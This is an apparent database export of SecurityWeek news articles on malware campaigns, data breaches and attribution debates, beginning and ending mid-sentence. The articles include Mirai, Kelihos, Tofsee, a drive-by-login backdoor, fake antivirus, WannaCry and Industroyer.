out to be a version of X-Agent or Fysbis spyware if you’re a Linux user, and Sednit if you’re running Windows.\" Among the organizations hit by the group included the White House. According to Trend Micro, the attackers targeted three popular YouTube bloggers with a Gmail phishing attack on Jan. 26 - four days after the bloggers had interviewed President Barack Obama at the White House. \"This is a classic island hopping technique, in which attackers focus their efforts not on the actual target but on companies or people that might interact with that target, but which may have weaker security in place,\" he blogged. \"In a similar way, a well-known military correspondent for a large US newspaper was hit via his personal email address in December 2014, probably leaking his credentials. Later that month Operation Pawn Storm attacked around 55 employees of the same newspaper on their corporate accounts.\" Just recently, the attackers took to using malware targeting iOS devices to infect users.  " }

The tool, named BASS, has been described as an automated signature synthesizer. The framework creates signatures from malware belonging to previously generated clusters and its main goals are to improve resource usage and make malware analysis easier. Talos says BASS is designed to reduce the resource usage of Cisco’s ClamAV open source antivirus engine by generating more pattern-based signatures instead of hash-based signatures. The tool can also help reduce the workload of analysts who write pattern-based signatures. The Python-based framework is implemented as a cluster of Docker containers, which makes it easily scalable, and it leverages web services to interact with other tools. According to Talos, thousands of signatures are added to the ClamAV database every day and many of them are hash-based. The problem with hash-based signatures, compared to bytecode- and pattern-based signatures, is that a signature is used to identify a single file instead of an entire malware cluster. This has several disadvantages, including a bigger memory footprint. Pattern-based signatures are easier to maintain compared to bytecode signatures, which is why Cisco prefers this type of signature. The BASS framework takes malware clusters from various sources and each file is unpacked using ClamAV unpackers. Once the malware cluster is filtered to ensure that the files correspond to the input expected by BASS (i.e. Portable Executable files), the binaries are disassembled using IDA Pro or other disassembler, and the tool searches the samples for common code that can be used to generate the signature. The source code for the Alpha version of BASS is available on GitHub. Cisco Talos will maintain the tool, but the company welcomes any feedback for improving its functionality. " }

The company learned about the breach in mid-October after being alerted by a third party, and customers were first notified on November 14. Forever 21 operates over 800 stores in 57 countries around the world, and it’s the 5th largest specialty retailer in the United States. The firm has yet to provide information on which stores are affected. It’s still working on determining if stores outside the U.S. are impacted as they use a different payment processing system, but reassured customers that its website, forever21.com, has not been breached. According to the retailer, hackers penetrated its systems and installed a piece of malware designed to steal payment card data as it was being routed through point-of-sale (PoS) devices. The company has been using encryption technology to protect sensitive data, but the system was “not always on,” allowing unauthorized access to payment card information. The company’s investigation revealed that in most cases the malware was only able to collect card numbers, expiration dates and internal verification codes, but cardholder names were also compromised in some instances. The malware was present on Forever 21 systems between April 3 and November 18, 2017. In some stores the malware was active throughout this period, but some locations were only affected for a few days or several weeks. “Additionally, Forever 21 stores have a device that keeps a log of completed payment card transaction authorizations,” Forever 21 said in a statement. “When encryption was off, payment card data was being stored in this log. In a group of stores that were involved in this incident, malware was installed on the log devices that was capable of finding payment card data from the logs, so if encryption was off on a POS device prior to April 3, 2017 and that data was still present in the log file at one of these stores, the malware could have found that data.” This is not the first time Forever 21 has informed customers of a security incident involving payment cards. Back in 2008, the company said nearly 99,000 cards may have been compromised in a series of hacker attacks spanning between 2004 and 2007. Forever 21 is not the only clothing retailer to disclose a data breach in recent years. Brooks Brothers and Buckle also reported finding malware on their payment systems last year, and Eddie Bauer informed customers of a cyber intrusion in 2016. " }

The Windows desktop tool, which is being spread via spam e-mail, promises free SMS alerts on bitcoin marketplaces. However, in the background, the malware is capable of stealing log-in credentials to hijack valuable bitcoins from infected machines. Arbor Networks researcher Kenny MacDermid said the 'Bitcoin Alarm' utility comes with an encrypted file that is actually the NetWiredRC remote-access Trojan.  NetWiredRC is best described as a Windows backdoor that allows unauthorized access and control of an affected computer. An attacker can perform any number of different actions on an affected computer, including the download and execution of arbitrary files; keystroke logging; file deletion and even self-propagation to other computers.  MacDermid said he received several spam messages pointing to a Web site to download the malware and decided to investigate when he discovered that it contained a script to check whether the Avast anti-virus program was installed on the machine. \"It's a pretty solid chance that if software is checking for an antivirus engine, that it's up to no good,\" MacDermid said. He ran several tests and came to a basic conclusion: \"This free utility is nothing more than malware with very low detection rate being spammed to anyone that might have a bitcoin sitting around.\" " }

A copy of the source code files provided to SecurityWeek includes a “readme” where the author of Mirai explains his reasons for leaking the code and provides detailed instructions on how to set up a botnet. “When I first go in DDoS industry, I wasn't planning on staying in it long,” the hacker said. “I made my money, there's lots of eyes looking at IOT now, so it's time to GTFO. However, I know every skid and their mama, it's their wet dream to have something besides qbot.” The hacker claimed his botnet had ensnared up to 380,000 bots via telnet attacks alone, but ISPs allegedly started cleaning up their act following the DDoS attacks aimed at Krebs’ website. He says the number of bots has dropped to roughly 300,000 and continues to decrease. The leaked files include source code for the bot, command and control (C&C) servers, and tools. The author of Mirai says he is willing to answer specific questions about setting up the botnet, but he is determined not to waste any time teaching wannabe cybercriminals or answering vague questions. Mirai, believed to have made rounds since May 2016, infects IoT devices protected by weak or default credentials. Once it hijacks a device, the threat abuses it to launch various types of DDoS attacks, including less common UDP floods via Generic Routing Encapsulation (GRE) traffic. One of the first groups to analyze this threat was Malware Must Die, although the author of Mirai said the analysis was inaccurate. Researchers from Russian antivirus firm Dr. Web reported last week that they had seen newer versions of the Trojan in September. The company has published a 56-page report describing the malware, which it detects as Linux.Mirai. The attack that hit Brian Krebs’ website peaked at over 600 Gbps, while the simultaneous attacks aimed at hosting provider OVH exceeded 1 Tbps. Octave Klaba, the founder and CTO of OVH, said the botnet was powered by more than 150,000 IoT devices, including cameras and DVRs, capable of launching attacks of over 1.5 Tbps. The attack targeted at Krebs was launched after the journalist published a blog post exposing the alleged operators of a booter service called vDOS, which led to the arrests of two Israeli nationals. The “readme” file published by the author of Mirai is signed with “FREEAPPLEJ4CK” – AppleJ4ck is the online moniker used by one of the vDOS operators. Now that Mirai’s source code has been made available, the malware will likely be abused by many cybercriminals, similar to the case of BASHLITE, whose source code was leaked in early 2015. In late August, Level 3 Communications and Flashpoint reported that BASHLITE DDoS botnets had ensnared roughly one million IoT devices. " }

In spam emails, the attackers promise software designed to attack those governments in retaliation for sanctions tied the crisis in the Ukraine. What the users actually get however is a serving of the notorious Kelihos malware. Users who click the malicious links in the spam email download the Trojan, which drops three clean files used for traffic monitoring (npf_sys, packet_dll, wpcap_dll) and is capable of mining sensitive browser data, Internet traffic and other personal information. Also known as Hlux, the Kelihos botnet was first discovered roughly four years ago. During its history, it has mainly been linked to spamming and Bitcoin theft. \"With the Ukrainian conflict in mind, hackers have crafted ingenious spam messages that help them deliver the Trojan to those who support the Russian “cause” and dislike measures taken against the country,\" according to BitDefender. \"Users who click the malicious links are unwillingly joining the botnet and spreading the malware further.\" The spam contains a message claiming to come from hackers or programmers from the Russian Federation who are upset about \"unreasonable sanctions\" that Western states imposed against their country. The attackers tell the user that if they run the application on their computer, it will begin to secretly attack government agencies of the countries that imposed those sanctions. To help promot the application, the attackers also added that their program works silently and uses only limited amount of computing power. The messages also state that after rebooting the user's computer, the program will terminate its activities.  Some of the text of the messages varies, and in some cases includes the suggestion recipients turn off their antivirus software while running the program, security researchers at Websense noted, adding they believe the attack campaign began August 20.  \"The variants we have analyzed so far in this campaign seem to have the spambot and sniffing functionality; no DDoS behavior has been observed during preliminary analysis,\" according to Websense Senior Security Researcher Ran Mosessco. \"Even so, the damage for a business allowing their infrastructure to run such malware could be significant (blacklisting for example).\" Once on the computer, the Kelihos Trojan communicates with the command and control center by exchanging encrypted messages through HTTP to retrieve further instructions. Depending on the payload, Kelihos can do any of the following: communicate with other infected computers; steal Bitcoin wallets; send spam; steal FTP and email credentials; download and execute other malicious files on the affected system; and monitor traffic for FTP, POP3 and SMTP protocols. The Bitdefender Labs analyzed one of the recent malicious spam waves and noticed that all the .eml files lead to setup.exe links, with five unique IPs. Three belonged to Ukraine, while the other two were retrieved in Poland and the Republic of Moldavia. \"Some might be servers specialized in malware distribution or other infected computers that became part of the Kelihos botnet,\" Bitdefender Virus Analyst Doina Cosovan said in a statement. \"It is somehow ironic that most of the infected IPs are from Ukraine. This either means that computers in the country were also infected, or that Ukraine itself is where the distribution servers are located in.\" " }

According to the retailer, malware was present on PoS systems at some of its stores between October 28, 2016, and April 14, 2017. The company has called in outside experts to investigate the incident and help secure its network. The malware was designed to steal data from a card’s magnetic stripe, including cardholder name, account number and expiration date, but The Buckle believes the malware did not collect data from all transactions conducted via infected PoS systems. The company pointed out that all its stores support EMV (chip card) technology, which makes it significantly more difficult to clone cards using stolen data. Nevertheless, the compromised payment card data can still be useful to cybercriminals, particularly for card-not-present fraud. The Buckle said there was no evidence that social security numbers, email addresses or physical addresses were obtained by the attackers, and there is no indication that its website and online store are affected. “As part of Buckle’s response, connections between Buckle’s network and potentially malicious external IP addresses were blocked, potentially compromised systems were isolated, and malware-related files residing on Buckle’s systems were eradicated. Additionally, Buckle reported a potential incident to the payment card brands and is cooperating with them regarding this incident,” the company said in a statement. The Buckle has advised customers to keep an eye out for any suspicious activity on their payment card, and immediately report any unauthorized charges to the card issuer. A list of affected stores has not been made available. The Buckle’s announcement comes just two weeks after big box department store chain Kmart, which operates more than 700 stores, informed customers of a payment card breach.

The use of the certificates is yet another example of malware authors abusing the Internet's trust ecosystem in order to comprise users. With a stolen certificate in tow, a cybercriminal can sign a piece of malware and make it appear as though it is software from a legitimate developer.The tactic is not new; in fact, the notorious Stuxnet malware was observed using a valid signature when it was discovered by the security community in 2010. During the past month, a rogue antivirus program known as 'Antivirus Security Pro' (detected as Rogue:Win32/Winwebsec) has stepped up and adopted the tactic in a big way, as Microsoft speculates that the dozen or so certificates it has seen being used may just be the tip of the iceberg if there are other variants are out there.   \"A related family, TrojanSpy:Win32/Ursnif, has also been distributed with files signed using stolen credentials,\" blogged David Wood of Microsoft's Malware Protection Center. \"We have observed Winwebsec downloading Ursnif, a Trojan that monitors web traffic, and steals sensitive information, including passwords. Earlier variants of Ursnif were also capable of stealing certificates and private keys, but this functionality does not appear to be present in the latest versions. Instead, it appears to have been added to certain samples of PWS:Win32/Fareit.\"   The certificates used by Antivirus Security Pro were issued to developers by some of the most prominent certificate authorities in the world, including VeriSign and Comodo. According to Microsoft, one of these certificates was issued just three days before researchers saw malware samples signed with it, suggesting that the malware’s distributors are regularly stealing new certificates as opposed to using older certificates they previously stockpiled.   \"Just as it is important to keep your house and car keys secure, securing your code-signing private keys is essential,\" Wood blogged. \"Not only is it inconvenient, and often expensive, to have the certificate replaced, it can also result in loss of your company’s reputation if it is used to sign malware.\"   \"Certainly, no system used to store code-signing credentials should ever be used for web browsing, and it is vital that these systems run a regularly updated antivirus solution, and that any file you sign has been scanned for possible virus infection beforehand,\" he continued.

Tofsee, a multi-purpose malware that has been around since 2013, allows cybercriminals to conduct various activities, including click fraud, cryptocurrency mining, DDoS attacks and sending spam. Up until June 2016, cybercriminals distributed the malware using the RIG exploit kit and malvertising campaigns. Then, after the notorious Angler exploit kit disappeared from the scene, cybercriminals started leveraging RIG to deliver other payloads, which experts believe might have been more profitable. After RIG stopped delivering Tofsee, cybercriminals turned to email spam campaigns to infect computers. Typically, the Tofsee botnet has been used to send spam emails advertising adult dating and pharmaceutical websites. However, in August, researchers noticed that the spam messages had changed and started delivering Tofsee malware downloaders. The volume of these spam emails has gradually increased since mid-August, reaching more than 2,000 messages on some days in September, Cisco Talos reported. The spammy emails are adult-themed and they purport to come from women in Russia and Ukraine. Recipients are instructed to download and open the ZIP archive attached to the messages as it allegedly contains pictures of the sender. Instead of pictures, the archive contains an obfuscated JavaScript file that includes a WScript downloader designed to fetch and run an executable from a remote server controlled by the attacker. Once the file is executed, the system becomes infected with Tofsee. The malware connects to various SMTP relays, which it uses to send spam emails. The threat also initiates HTTP connections as it simulates clicking on ads as part of its click fraud mechanism. Since the demise of Angler, the RIG exploit kit has been used to deliver the SmokeLoader (aka Dofoil) backdoor and other malware. Its developers have been working on improving the kit with new exploits and command and control (C&C) patterns that could help it evade detection. Earlier this week, researchers reported that RIG had taken the place of Neutrino in a massive malvertising campaign that delivered CryptMIC ransomware. The campaign had previously used Neutrino, which took the leading position after Angler disappeared. " }
{ "_id" : { "$oid" : "5b27c4906cefc41c844ab369" }, "Category" : "Malware", "Title" : "Malicious Actors Use \"Drive-by-Login\" Technique in Targeted Attacks", "Address" : "https://www.securityweek.com/malicious-actors-use-drive-login-technique-targeted-attacks", "Date" : "April 14, 2015", "Article" : "High-Tech Bridge has spotted an interesting attack in which the threat actor used what researchers believe is a new vector for delivering malware to a targeted individual. Dubbed by the security firm “drive-by-login,” the technique is similar to drive-by downloads in which malware is delivered to victims when they visit the attacker’s website. However, in drive-by-login attacks, the attacker sets up malicious code on a website he knows the victim is going to visit. The malicious code is designed to deliver malware only to the targeted user, not all website visitors. High-Tech Bridge analyzed such an attack after being alerted by the owner of a medium-size online store in Central Europe. The customer noticed that his website was trying to infect his computer with malware. Initially, researchers believed it might have been a false positive since they didn’t see any attempts to deliver malware, but a closer investigation revealed that it was actually a cleverly staged targeted attack. The online store had been running osCommerce Online Merchant v2.3.4, a version released in June 2014. On the targeted server, researchers discovered an osCommerce backdoor file named “ozcommerz_pwner.php.bak.” “The backdoor patches the ‘/includes/application_bottom.php’ osCommerce script with a malicious code that loads arbitrary remote content (malware) based on website visitor’s IP or on visitor’s profile email (for registered customers only),” High-Tech Bridge explained in a blog post. In order to avoid raising suspicion, the backdoor restores the modified script’s timestamp to make the file appear unchanged. Once the malware is delivered, the content of the “application_bottom.php” script is restored to ensure that if the attack is analyzed, the malicious code is not accessible to investigators. In the attack against the owner of the Central European online store, the malicious actors had already restored the file’s content before researchers analyzed it. However, experts managed to find a copy of the backdoor in one of the backups. The backdoor, which isn’t detected by any antivirus engine as being malicious, was set up to deliver malware only when the IP and email address of the targeted store owner was detected. The malicious code didn’t deliver the malware directly. Instead, it was designed to redirect the victim to a popular exploit kit, which attempted to push the threat onto the user’s system by leveraging recently patched Adobe Flash Player vulnerabilities. In the attack analyzed by High-Tech Bridge, the malicious actor also stole the shop’s database. The website was apparently compromised through the exploitation of a vulnerable third-party plugin. According to researchers, drive-by-login attacks can be highly dangerous because they don’t require any social engineering and they can’t be prevented through security training. An attacker only needs to compromise a website that the targeted individual is likely to visit, and obtain information that will help single out the victim. Such information is not difficult to obtain since users often expose themselves on social networks and websites, Ilia Kolochenko, the CEO of High-Tech Bridge, told SecurityWeek. Another problem with drive-by-login attacks is that they are difficult to detect by malware and website scanning services since the threat is only delivered to the targeted user. “Malware scanning solutions are unlikely to detect anything, simply because the malware won't be injected to the solution crawler that checks the website. Malware is injected only to one specific victim, and only this victim can notice the malware,” Kolochenko explained. The expert says the best way to mitigate such threats is by deploying a sophisticated file integrity monitor, ensuring that the Web server is properly patched and configured, and by performing penetration testing on a regular basis. “Drive-by-login attacks mean that no websites are safe anymore. Any website, regardless it’s size or purpose, may become a victim of targeted and sophisticated hack. Finally, this means that no websites can be considered secure or trusted anymore. This is the beginning of the end of safe web,” said Marsel Nizamutdinov, chief research officer at High-Tech Bridge. Kolochenko believes it’s unlikely that the drive-by-login vector will be leveraged in mass attacks, but he is confident that the number of attacks targeting individuals or small groups of what he calls “VIP victims” will increase.

They join the United Kingdom, which blamed Pyongyang for the attack back in October. While some security firms pointed the finger at North Korea shortly after the attack, Japan and the Five Eyes countries claim their intelligence agencies reached the same conclusion after conducting their own investigations and sharing data with each other. North Korea has once again denied the accusations, claiming that Washington was demonising it.  Some industry professionals point to evidence showing that these governments’ assessment is accurate, while others highlight that attribution is a difficult task, and warn that the world is not ready for the next WannaCry. And the feedback begins... Benjamin Read, Manager, Cyber Espionage Analysis, FireEye: “FireEye has found the WannaCry malware shares unique code with WHITEOUT malware that we have previously attributed to suspected North Korean actors. While we have not verified other experts’ observation of known DPRK tools being used to drop early versions of WannaCry, we have not observed other groups use the code present in both WannaCry and WHITEOUT and we do not believe it is available in open source. This indicates a connection between the two.   Our analysis has found this unique code shared across additional North Korean malware, including NESTEGG and MACTRUCK. Significantly, while this code is present in the MACTRUCK malware, it is not used. The shared code likely means that, at a minimum, WannaCry operators share software development resources with North Korean espionage operators.   In addition to the WannaCry activity, we believe that North Korean actors are using multiple vectors to engage in cyber-criminal actively, including, most prominently, the targeting of Bitcoin exchanges. FireEye assess that North Korea will continue to pursue financially motivated cyber intrusion to supplement the government's income.” Tim Erlin, VP of Product Management and Strategy, Tripwire: “Accurate attribution for cyber attacks is almost always a difficult task, and it’s doubly so when the evidence leading to the conclusion can’t be shared.   With global public trust in the US government at a low point, it’s not surprising that there’s skepticism. If we’re going to have national security organizations delivering these types of conclusions on attribution to the public, we need to find a way to develop trusted output. The mantra of ‘trust us’ doesn’t cut it here.   This conclusion about North Korea’s culpability isn’t new. The UK discussed the very same conclusion in October, with the very same caveats about sharing the actual evidence. You can’t arrest a nation-state, which inevitably prevents any real closure on an incident like WannaCry.” Chris Doman, Threat Engineer, AlienVault: “WannaCry was linked to a group known as Lazarus, which others have linked to North Korea. There were two data points linking WannaCry to Lazarus - a number of rare code overlaps between WannaCry and Lazarus malware, and Symantec saw an early version of WannaCry manually deployed by Lazarus on one of their clients. The US government may have additional information, but the evidence provided at the time by the private sector was pretty strong.   The evidence linking Lazarus to North Korea is similarly strong. There are a very small number of publicly assigned internet addresses assigned to North Korea, and they pop up in Lazarus attacks. The attacks have been dated back to at least 2007, and often contain other clues such as North Korean fonts.   Things take time to come out of the government - but the timing today may have to do with other events. Lazarus have been particularly active recently - I’m seeing numerous new malware samples from them daily. A lot of their current activity involves stealing bitcoin and credit card numbers.” Dmitri Alperovitch, CTO and Co-founder, CrowdStrike: “[The US Government’s announcement] of its official public attribution of the WannaCry attack to North Korea regime is another step in establishing the importance for regularly attributing significant attacks to nation-states and criminal groups. It also raises public awareness about North Korea’s growing offensive cyber capabilities. CrowdStrike has tracked DPRK’s cyber activities going back to the mid-2000s, which started with espionage, then half a decade later evolved into destructive attacks and in the last few years delved into cybercrime such as ransomware and bank heists. They are a very capable actor that is known to have developed 0-day exploits and their own unique malware code. As such, they pose a major threat to organizations globally, especially as tensions between the US and North Korea over the nuclear and missile programs continue to escalate.” Joseph Carson, Chief Security Scientist, Thycotic: \"Cyber attribution is one of the most difficult tasks in cybersecurity today. Unless the devices are persistent, it is almost impossible to identify who was sitting behind the keyboard, let alone who was instructing that person to carry out the malicious activity without any advanced cyber forensics tools. When attribution is pointing to a nation state, it is crucial that the attribution is communicated by the impacted government and not any private company or entity. Private companies should focus on getting back to a secure and operational state and assist in evidence that assist the government in accordance to any compliance requirements. In my experience, when cybercrime crosses international borders, it is difficult to claim attribution without cooperation of the country to where the evidence leads.   The challenge with calling out a group like Lazarus, which is widely believed to be associated with North Korea and several previous cyber-attacks, is that it is important to be clear that this is a group and motives can change depending on who is paying. I have found when researching hacking groups they can one day be working for one government under one alias and another using a different alias. This means that association in cyberspace means nothing. In my experience in digital forensics, I have always followed two rules when analyzing a cyber-crime: follow the motive or follow the money — either one will lead to the criminal.   In both WannaCry and NotPetya it looks like the motive was not financial. To me, it is clear that multiple bad actors played a part in the creation and malicious use of the ransomware. The payload and financial portion of the crime appears to be constructed by two different groups of cybercriminals. Remember, the real purpose of ransomware can be a combination of motives, or involve multiple threat actors with different motives. It is always important to step back and think: if this was your crime how would you have done it? It’s crucial to be able to think and look at the world through the eyes a hacker or cyber-criminal.” Michael Daly, CTO, Raytheon Cybersecurity and Special Missions: “The message for any company doing business on the internet is that North Korea sees you as a target. So do other rogue nation-states, and so do transnational crime organizations. For them, ransomware is an irresistible crime. It keeps hundreds of millions of dollars in untraceable cryptocurrency flowing in, all the while causing chaos in places like hospitals, power plants, train stations, financial institutions and telecommunications companies.   It's no coincidence the administration announced its findings in a publication they knew would reach the people who have the power and influence to strengthen networks in the commercial sector. Stronger networks are more expensive to attack, and when we increase the cost of cybercrime, we undermine the incentive for the attack.” Travis Farral, Director of Security Strategy, Anomali: “Attributing certain attacks or specific malware to an actor, group, or nation-state is difficult in the cyber world. Often, attribution is made as a best-guess based on available evidence. In the case of WannaCry, a handful of prominent security companies noted clues that pointed to the Lazarus Group, a North Korea associated actor group, as the potential culprits behind the malware. The cited links connecting North Korea to WannaCry have been far from conclusive, however. The U.S. Government claims to have evidence indicating that North Korea was indeed behind WannaCry. They may have such evidence, but because they have not shared the details with the public, it is a case of trusting their judgment on the matter.” Atif Mushtaq, CEO, SlashNext: “The interesting thing about malware is that, like any other product that works effectively, it can become widely-adopted. We recently blocked an exploit called “EternalBlue” which takes advantage of a Microsoft Windows Security flaw to gain entry using the network file sharing protocol (TCP ports: 139, 445). Similarities, including infection vectors, code sequences, infrastructure and exploitation techniques, link this to the APT called “Unit 180,” as well as a backdoor program called Contopee, originating from Lazarus, a North Korean hacking group. The core malware gets used but each hacking group modifies their attack strategy in order to evade signature- or sandbox-based detection mechanisms.” Chris Morales, Head of Security Analytics, Vectra: “Most industry experts believe that North Korea is engaged in finding alternative means for funding their efforts as they have been cut off from traditional financial channels. When WannaCry was first detected, we saw similarities in the code used for that ransomware attack with previous attacks attributed to North Korea, like the Sony hack. North Korea has been targeting banks directly with banking malware while using ransomware against other organizations to acquire a large volume of Bitcoin. North Korea has benefited greatly from with the meteoric rise in bitcoin over the past year. With the success in financial gain they have received from cybercrime, we can expect to see more.   We anticipate that many more ransomware attacks will continue to occur. They will have different names and use different exploits. What won’t change is the nature of the attacks and their associated behavior. While we don’t know when the next big attack will occur, enterprises need to be ready for it. Ongoing advances in AI have allowed technology to augment the efforts of cybersecurity teams. And there must be a seismic shift in the cybersecurity industry to identify attacker behaviors fast and early to stop ransomware attacks.” Eddie Habibi, Founder and CEO, PAS: “While attribution is an important question to answer, the real question is are we prepared for the next WannaCry? The lifeblood of critical infrastructure plants – where electricity is generated, fuel is produced, and drinking water is cleaned – are industrial control systems. They are responsible for process safety, production uptime, and environmental protection. Attacks on these systems have increased seven-fold since 2010, and the bad guys are achieving greater success with every attack.   Even after WannaCry initially hit, many plants had systems that remained unpatched. Just last week, attackers were successful taking control of safety systems in a plant with malware called TRITON/TRISIS. They did not need a vulnerability to assert control; they only needed specific process knowledge and an unprepared plant environment.   The threat landscape is fluid, and risk is increasing for critical infrastructure companies. Traditional IT security controls are not keeping pace with the requirements of operational technology systems, and industries need better methods to increase visibility into their most critical cyber assets – eighty percent of which are largely invisible to security personnel today. The basic fact is, you cannot protect what you cannot see.” " }

These rogue anti-virus camapigns display numerous virus warnings on infected machines in an effort to trick users into paying a fee to have the so-called threats removed. With the emergence of ransomware, fake anti-virus has witnessed a significant decline recently. However, while such threats might not be as common as they used to be, cybercriminals continue to use them to make a profit. Security researchers at Microsoft have been monitoring the evolution of fake AVs and they've noticed that pieces of malware such as Win32/Winwebsec, Win32/OneScan, Win32/FakeXPA and Win32/FakePAV, which at one point were the most prevalent of the rogue families, have been on a downward trend all over the world. \"However, since the big malware 'players' are having more trouble in taking advantage of users paying for fake security products, and are moving away from this kind of social engineering, we are seeing other players willing to fill the gap – luckily with small impact,\" Daniel Chipiristeanu of the Microsoft Malware Protection Center explained in a blog post. One example is the fake AV detected by Microsoft as Rogue:Win32/Defru. It's not uncommon for such malware to prevent victims from visiting the websites of security solutions providers to ensure that the infection cannot be easily removed. However, Defru takes it even further by using the \"hosts\" file to redirect users to a fake antivirus website. When the victims attempt to access sites like apple.com, bing.com, facebook.com, microsoft.com and yahoo.com, they are taken to a bogus \"Windows Security\" page where they're presented with a fake scan and several malware alerts. A total of more than 300 websites are targeted by Defru, including security websites, news websites, social networks and other popular online services. After being presented with the bogus warnings numerous times, users might give in and agree to pay to have their computers \"cleaned up.\"  The cybercriminals behind this operation appear to be targeting Russian speaking users, with most victims being located in Russia, Ukraine and Kazakhstan. \"The rogue is written in PHP, uses a PHP EXE compiler (Bambalam) and will copy itself to %appdata%\\w1ndows_<4chars>.exe (e.g. \"w1ndows_33a0.exe\"). It persists at system reboot by adding itself to the registry key HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run with the value \"w1ndows_<4chars>,\" said Chipiristeanu. Fortunately, it's not difficult to remove the malware from an infected device. Users must remove the entry value from the \"Run\" registry key, and delete the executable file from disk and the entries from the \"hosts\" file.  Dodi Glenn, senior director of Security Intelligence and Research Labs at ThreatTrack Security, believes that redirecting users from good websites to malicious ones can be an effective method to siphoning money from victims. \"There has been a big decline in rogues lately. We tend to see spikes in rogue malware distribution towards September, when students are going back to school, and the holiday season begins. The miscreants will typically prey on people who are searching for hot topics, such as Christmas gifts, etc., by setting up drive by download sites, infecting machines which have vulnerabilities on them,\" Glenn told SecurityWeek. Experts say cybercriminals are moving away from fake anti-virus attacks because they're not as profitable as they used to be. \"Fake A/V is something that we’ve been monitoring for a long time and it has been a favorite tool in the arsenal of cyber criminals given the ease with which users can be tricked into either paying for a bogus subscription, or downloading malware when presented with what looks like a legitimate anti-virus alert,\" said Jayce Nichols, chief of threat analysis and innovation at iSIGHT Partners.   \"The reduction in infections from Fake A/V most likely points toward a decrease in profitability for the criminal actors using it – either driven by heightened user awareness and (more likely) effective combatting techniques from anti-malware vendors. Criminal actors typically take the path of least resistance which also promises the highest return. Cyber criminals gravitate towards the most profitable options – if rogue / Fake A/V is becoming less profitable, they are going to use it less,\" Nichols told SecurityWeek. Both experts agree that ransomware is much more efficient when it comes to helping cybercrooks make a profit.  \"We believe that ransomware applications, like CryptoLocker, will continue to be created, in efforts to take money from victims. It is important to know that these applications are not only targeting Windows machines, but also Android devices,\" Glenn said. \"We’ve seen a rise in ransomware – primarily because unlike Fake A/V, the bad actors can actually hold the victim over a fire by encrypting their files. We reported on an active campaign using ransomware just the other day – which appears to use a new variant we dubbed 'TorrentLocker' – and we think that we’ll continue to see broad use of ransomware as an alternative to Fake A/V moving forward,\" Nichols noted.   " }

Dubbed Industroyer and CrashOverride, this modular malware has several components: a backdoor, a launcher, a data wiper, DoS and port scanner tools, and at least four payloads. The payloads allow the malware’s operators to control electric circuit breakers via industrial communication protocols, which suggests that at least some of the malware’s developers have a deep understanding of power grid operations and industrial network communications.  Researchers described some theoretical attack scenarios involving this malware and warned that the threat could be adapted for attacks on other countries, including the U.S., and other sectors. Contacted by SecurityWeek, industry professionals shared some thoughts on the threat posed by CrashOverride/Industroyer, and provided recommendations on how organizations can protect their systems. And the feedback begins... Phil Neray, VP of Industrial Cybersecurity, CyberX: “Unlike in the first Ukrainian grid attack, where humans were required to remotely control the mouse on compromised SCADA workstations to open the breakers, this malware hijacks ICS devices by communicating directly with them in an automated way, using native ICS protocols such as OPC and IEC 101. We've only seen that once before, with Stuxnet. Another interesting way it's similar to Stuxnet is that it manipulates ICS systems to report back that everything's OK when in fact it isn't. [...] The malware is very modular and could easily be extended to support other protocols such as DNP3 that are commonly used in US electric utilities. But it could also be extended to attack other industries such as manufacturing, food processing, chemicals, and pharmaceuticals. We've already seen that nation-states and cybercriminal organizations commonly share advanced tools, so it's easy to imagine the same tools being used to lock down factories and hold companies up for a lot of ransomware. Another plausible scenario would be stealing corporate trade secrets by probing ICS devices for proprietary information about manufacturing processes and formulas, and then selling the sensitive IP to competitors or to the Chinese on the black market.” Eric Cornelius, VP of Innovation, Cylance: “Despite the fact that power grids around the world could be exploited by such a tool, the fear that our nation’s infrastructure will be attacked is largely unfounded. Simply because this weapon is made of code rather than lead doesn’t change the response that its use on our civilian infrastructure will provoke. Given our heightened sensitivity to cyberattacks due to the recent evidence of election tampering, it is easy to conclude that our power grid will be next. That being said, we can’t forget that it is the role of militaries around the world to develop, and test, weapons to use in the defense of their national interests. The existence of these weapons alone however, does not imply the intent to use them in acts of aggression and the concept of mutually assured destruction remains as true today as it did in the height of the cold war.   The takeaway from the discovery of this tool should be a firm reminder that the security of our critical infrastructure is on the minds of our adversaries and should remain at the top of ours. Whether or not there is an immediate intent to harm us, our way of life is inextricably linked to our aging infrastructure and the road to resiliency is long. The time to protect our future is now, yet our calls to action are all too often silenced by the uproar of the next big headline.” Jalal Bouhdada, Founder and Principal ICS Security Consultant, Applied Risk: “Industroyer seems to be just a communication driver which toggles commands to achieve undefined or abnormal behaviour, of course the platform is build with smart logic in mind to cause destruction. The modular design might be an indication that the malware will be used in different environments, possibly hitting the US as well, as (DNP protocol for example) modules can be added at the desire of the Industroyer creators. Adding more advanced modules seems to be a viable options for the attackers, allowing them to perform targeted attacks a la Stuxnet.   We can debate who is responsible for creating such malware however what matters the most is how easy to create such piece of malware (like PoC ransomware Scythe) which target industrial devices. Industroyer is attacking the principal design choices of industrial protocols. Moreover If authentication was used to secure the communications between SCADA application in field devices, we wouldn’t had to face the effects of this malware. As little requirements are needed to perform Industroyer-like attacks, a fair prediction would say that we will see such malware more often, targeting a variety of industries (One can literally use legitimate tools to recreate the effects of Industroyer).” Learn More at SecurityWeek’s 2017 ICS Cyber Security Conference Avi Chesla, CEO and Founder, empow: The latest cyberthreat out of Russia – the CrashOverride malware – is particularly dangerous because it is capable of executing various malicious activities against different systems autonomously. Yes, it still may require control from the outside, but with developments in AI, hackers can develop ever-more sophisticated, “smarter” malware that can do an enormous amount of damage without human intervention. For example, they can independently identify patterns of different system types and vulnerabilities and decide how to exploit them.   So “self-sufficient” malware is the future of cyberattacks. The WannaCry attack demonstrated some initial basic capabilities – ransomware that can propagate inside the network – which make it more independent than most previous ransomware we’ve seen. In 2015, the Russian malware used to disrupt the power supply network in Ukraine required hackers to remotely manipulate control systems. But the definite trend is toward malware that does not require external activation, and can independently act and propagate inside its target organization.” Patrick McBride, CMO, Claroty: “Industrial control systems have been exposed to attack for quite some time. The combination of IT/ICS network convergence – providing poorly secured pathways to industrial control environments that were not designed with cybersecurity in mind – is a dangerous mix. Individual systems have varying, often lackluster security controls in place. While it is very simple to attack ICS networks and cause some level of damage/outage to processes, plants and the electric grid, it is harder to cause permanent damage because of safety systems and the unique system/environment knowledge required to build malware with a more permanently destructive payload. But the systems are dangerously unprotected and the level of sophistication required to cause outages and real damage has been lowered. You don’t need “nation state”-level expertise to copy or reuse existing malware like Industroyer or WannaCry to impact industrial systems.   It is unclear, at 